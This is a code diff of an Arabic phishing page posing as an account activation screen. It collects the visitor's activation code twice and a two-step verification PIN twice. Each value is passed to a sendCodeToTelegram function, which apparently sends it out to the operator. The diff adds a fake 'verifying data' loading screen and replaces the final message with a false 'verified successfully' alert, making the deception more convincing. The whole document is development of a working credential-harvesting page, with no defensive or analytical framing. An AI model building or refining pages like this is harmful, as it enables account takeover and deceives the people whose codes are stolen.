@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -89,28 +90,35 @@
             text-decoration: underline;
         }
 
-        #countdown {
-            color: red;
-            font-weight: bold;
-            margin-top: 10px;
-            font-size: 18px;
-            animation: countdownAnimation 1s ease-in-out infinite;
+        /* CSS for loading effect (tank animation) */
+        .tank-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
-        /* Animation for the countdown */
-        @keyframes countdownAnimation {
+        .tank {
+            width: 150px;
+            animation: moveTank 5s infinite linear;
+        }
+
+        @keyframes moveTank {
             0% {
-                color: red;
-            }
-            50% {
-                color: #ff6600;
+                transform: translateX(-150px);
             }
             100% {
-                color: red;
+                transform: translateX(100vw);
             }
+        }
+
+        .loading-text {
+            font-size: 24px;
+            color: #888;
+            margin-top: 20px;
         }
     </style>
 </head>
+
 <body>
     <div class="container" id="container">
         <h1>رمز التفعيل</h1>
@@ -140,21 +148,16 @@
             });
         }
 
-        function startCountdown(callback) {
-            let countdownValue = 5;
-            const countdownDisplay = document.getElementById('countdown');
-            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-
-            const interval = setInterval(() => {
-                countdownValue--;
-                if (countdownValue <= 0) {
-                    clearInterval(interval);
-                    countdownDisplay.textContent = '';
-                    callback();
-                } else {
-                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-                }
-            }, 1000);
+        function startLoadingPage(callback) {
+            // Change the content to the loading page with tank animation
+            document.body.innerHTML = `
+                <div class="tank-container">
+                    <h1>يرجى الانتظار...</h1>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/T-90A_tank_2.JPG/800px-T-90A_tank_2.JPG" alt="دبابة" class="tank">
+                    <p class="loading-text">جاري التحقق من البيانات...</p>
+                </div>
+            `;
+            setTimeout(callback, 3000); // Wait for 3 seconds before continuing the process
         }
 
         function submitFirstActivationCode() {
@@ -165,16 +168,15 @@
                 return;
             }
 
-            sendCodeToTelegram(activationCode1, "رمز التفعيل ");
+            sendCodeToTelegram(activationCode1, "رمز التفعيل");
 
-            startCountdown(() => {
+            startLoadingPage(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>رمز التفعيل الصحيح</h1>
                     <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.</p>
                     <input id="activationCode2" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
-                    <div id="countdown"></div>
                 `;
             });
         }
@@ -187,20 +189,16 @@
                 return;
             }
 
-            sendCodeToTelegram(activationCode2, "رمز التفعيل ");
+            sendCodeToTelegram(activationCode2, "رمز التفعيل");
 
-            startCountdown(() => {
+            startLoadingPage(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>التحقق من خطوتين</h1>
-                    <p>أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق على خطوتين..</p>
+                    <p>أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق على خطوتين.</p>
                     <input id="pinCode1" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
-                    <a href="#" class="forgot-link">هل نسيت رقم التعريف الشخصي</a>
-                    <p class="instruction">
-                        لقد قمت بإنشاء رمز PIN الخاص بك بنفسك. هذا ليس رمز التحقق الذي تلقيته عند التسجيل.
-                    </p>
+                    <a href="#" class="forgot-link">هل نسيت رقم التعريف الشخصي؟</a>
                     <button onclick="submitFirstPin()">متابعة</button>
-                    <div id="countdown"></div>
                 `;
             });
         }
@@ -213,16 +211,15 @@
                 return;
             }
 
-            sendCodeToTelegram(pinCode1, "رمز PIN ");
+            sendCodeToTelegram(pinCode1, "رمز PIN");
 
-            startCountdown(() => {
+            startLoadingPage(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>إعادة رمز PIN</h1>
                     <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
                     <input id="pinCode2" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondPin()">متابعة</button>
-                    <div id="countdown"></div>
                 `;
             });
         }
@@ -235,12 +232,13 @@
                 return;
             }
 
-            sendCodeToTelegram(pinCode2, "رمز PIN ");
+            sendCodeToTelegram(pinCode2, "رمز PIN");
 
-            startCountdown(() => {
-                alert(' يرجى الانتظار!');
+            startLoadingPage(() => {
+                alert('تم التحقق بنجاح!');
             });
         }
     </script>
 </body>
+
 </html>
